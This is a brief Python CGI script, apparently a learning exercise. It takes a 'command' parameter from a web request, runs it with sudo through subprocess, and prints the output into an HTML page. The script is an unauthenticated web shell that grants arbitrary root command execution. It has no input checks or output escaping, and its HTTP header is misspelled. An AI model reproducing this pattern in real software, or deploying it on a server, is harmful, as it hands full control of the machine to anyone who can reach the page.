#!/usr/bin/python3
import cgi
import subprocess
print("Conten-type: text/html")
print()

cmd=cgi.FieldStorage()
myx=cmd.getvalue('command')
output=subprocess.getstatusoutput('sudo '+myx)
status=output[0]
cmdout=output[1]

print(f"""\n\n
                \t\t\t\t\t\t\t-----------------------------
                        \t\t\t\t\t\t\tCOMMAND OUTPUT
                \t\t\t\t\t\t\t-----------------------------
        
                \t\t\t\t\t\t\t{cmdout}
""")

